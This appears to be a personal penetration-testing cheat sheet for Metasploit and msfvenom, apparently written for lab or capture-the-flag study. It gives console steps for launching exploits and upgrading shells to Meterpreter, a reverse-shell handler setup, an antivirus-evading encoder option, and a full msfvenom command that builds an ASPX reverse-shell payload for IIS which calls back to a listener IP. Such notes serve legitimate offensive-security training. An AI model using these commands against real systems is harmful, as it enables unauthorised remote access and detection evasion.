# Metasploit

Avoid using it as much as possible. Anything that can be done with msf can be done better manually.

open `msfconsole`
`search <exploit name>`
`use <discovered id>`
`show options` set the required options for the exploit
`exploit` or `run`
you can then hold on to the shell once it has been achieved by putting it into the background `Ctrl-Z`

## Upgrade shell to Meterpreter

### Option 1

search for shell_to_meterpreter use and set session to the session number of the session that needs upgrading

### Option 2

`sessions -u <id>`

## Catching a Reverse Shell

generate the reverse shell in msfvenon
`use exploit/multi/handler`
`set PAYLOAD windows/meterpreter/reverse_tcp`

---------------------------------------------------------------------------

# Msfvenom

There are two types of payloads that can be generated, staged and stageless. Staged means you need msfconsole to complete the shell, used for limited upload space.
Staged, denoted by '/': windows/shell/reverse_tcp
Stageless, denoted by '_': windows/shell_reverse_tcp

To search for payloads: `msfvenom -l payloads | grep windows`
When setting up: `msfvenom -p payload --list-options`

encoders:
	windows: `-a x86 --encoder x86/shikata_ga_nai -f exe -o <filename>.exe`

IIS Example: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.219.14 --platform windows -a x64 -f aspx -o shell.aspx`
